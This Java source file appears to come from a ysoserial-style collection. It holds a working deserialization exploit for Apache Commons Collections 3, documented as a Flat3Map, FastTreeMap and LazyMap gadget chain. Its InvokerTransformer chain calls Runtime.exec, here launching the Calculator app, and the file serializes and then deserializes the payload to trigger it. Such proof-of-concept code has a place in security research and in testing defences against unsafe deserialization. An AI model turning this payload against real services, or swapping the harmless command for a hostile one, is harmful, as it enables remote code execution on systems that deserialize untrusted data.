package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import org.apache.commons.collections.FastTreeMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.Flat3Map;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.util.Reflections;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * <org.apache.commons.collections.map.Flat3Map: void readObject(java.io.ObjectInputStream)>
 * -><org.apache.commons.collections.map.Flat3Map: java.lang.Object put(java.lang.Object,java.lang.Object)>
 * -><org.apache.commons.collections.FastTreeMap: boolean equals(java.lang.Object)>
 * -><org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
 *     ...
 */

public class CC3_Poc4 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        outerMap.put(333,333);

        FastTreeMap fastTreeMap =new FastTreeMap();
        fastTreeMap.put(111,1111);

        FastTreeMap fastTreeMap1 = new FastTreeMap();
        fastTreeMap1.put(222,222);

        Flat3Map flat3Map = new Flat3Map();
        flat3Map.put(1,1);
        flat3Map.put(2,2);
        flat3Map.put(3,3);
        Reflections.setDeclaredField(flat3Map,"key1",outerMap);
        Reflections.setDeclaredField(flat3Map,"key2",fastTreeMap);
        Reflections.setDeclaredField(flat3Map,"key3",fastTreeMap1);

        //         serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(flat3Map);
        outputStream.close();


//        //        deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();
    }
}
